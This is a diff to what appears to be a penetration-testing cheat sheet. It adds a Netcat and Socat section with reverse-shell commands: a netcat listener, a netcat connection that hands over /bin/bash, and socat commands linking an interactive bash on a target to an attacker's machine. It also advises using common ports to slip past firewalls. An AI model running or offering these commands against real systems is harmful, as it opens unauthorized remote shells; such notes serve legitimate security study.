@@ -31,6 +31,37 @@ $ dig mysite.com
 - [Sublist3r](https://github.com/aboul3la/Sublist3r)
 - [DNSdumpster](https://dnsdumpster.com/)
 
+## Netcat and SoCat
+
+### Netcat
+```
+$ nc -lvnp <port-number>
+```
+* -l is used to tell netcat that this will be a listener
+* -v is used to request a verbose input
+* -n tells netcat not to resolve hostnames or use DNS
+* -p indicates that the port specifications will follow
+
+Best practice when choosing a port. Use a well-known port (80, 443, 53). It has a better chance to not be blocked by firewall.
+
+To connect to the listener:
+```
+$ nc <target-ip> <chosen-port> -c /bin/bash
+```
+
+### Socat
+
+SoCat is like Netcat but on steroids
+
+Open a listening port on attacker machine
+```
+$ socat file:`tty`, raw, echo=0 tcp-listen:<port>
+```
+Open a connection from the target machine
+```
+$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker machine ip>:<port>
+```
+
 ## Privilege Escalation
 
 - [GTFOBins](https://gtfobins.github.io/)
